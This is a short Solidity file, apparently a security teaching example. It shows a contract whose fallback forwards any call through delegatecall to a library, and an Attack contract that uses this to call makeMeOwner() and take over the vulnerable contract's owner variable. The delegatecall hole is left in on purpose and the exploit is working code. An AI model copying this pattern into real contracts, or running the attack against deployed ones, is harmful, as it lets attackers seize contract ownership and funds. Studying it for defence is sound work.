// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Lib {
    address public owner;

    function makeMeOwner() public {
        owner = msg.sender;
    }
}

contract VulnToDelegatecall1 {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = _lib;
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public vulnToDelegatecall1;

    constructor(address _vulnToDelegatecall1) {
        vulnToDelegatecall1 = _vulnToDelegatecall1;
    }

    function attack() public {
        (bool success, ) = vulnToDelegatecall1.call(
            abi.encodeWithSignature("makeMeOwner()")
        );
    }
}
